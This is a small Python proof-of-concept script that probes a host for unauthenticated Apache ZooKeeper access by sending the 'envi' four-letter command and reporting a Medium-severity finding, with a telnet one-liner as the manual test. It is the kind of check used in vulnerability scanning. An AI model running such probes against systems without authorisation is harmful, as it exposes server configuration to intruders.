# coding:utf-8
import requests
import sys
import socket

def check(ip, port, timeout=2):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "envi"
        # envi
        # dump
        # reqs
        # ruok
        # stat
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if b'Environment' in data:
            row = {
                "wakaka": "ok",
                "level": "Medium",
                "vul": "zookeeper 未授权访问，测试POC:(echo envi | telnet ip port)"
            }
            print(row)
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) == 3:
        target = sys.argv[1]
        port = sys.argv[2]
        check(target, port)